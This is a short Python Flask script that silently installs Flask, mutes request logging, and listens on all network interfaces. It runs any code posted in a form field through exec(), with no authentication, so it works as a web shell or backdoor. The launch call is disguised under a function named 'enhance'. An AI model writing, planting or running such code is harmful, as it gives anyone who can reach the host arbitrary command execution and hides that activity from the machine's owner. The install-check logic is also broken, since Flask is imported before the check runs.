import subprocess
import sys
import os
import logging
from flask import Flask, render_template, request

# Function to install Flask if not already installed
def install_flask():
    try:
        import flask  # Try importing Flask
    except ImportError:
        print("Flask not found. Installing...")
        subprocess.run([sys.executable, "-m", "pip", "install", "Flask"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Install Flask if needed
install_flask()

# Suppress Flask's logging (werkzeug)
logging.basicConfig(level=logging.ERROR)
werkzeug_logger = logging.getLogger('werkzeug')
werkzeug_logger.setLevel(logging.ERROR)

# Create Flask app
current_directory = os.path.dirname(__file__)
app = Flask(__name__, template_folder=os.path.join(current_directory, 'templates'))

@app.route("/", methods=["GET", "POST"])
def index():
    output = ""  # Default output
    if request.method == "POST":
        code = request.form.get("code")  # Get code from form
        try:
            exec(code)
        except Exception as e:
            output = str(e)

    # Rendering the index.html file from the 'templates' folder
    return render_template("index.html", output=output)

def enhance():
    app.run(host="0.0.0.0", port=50, debug=False, use_reloader=False)

enhance()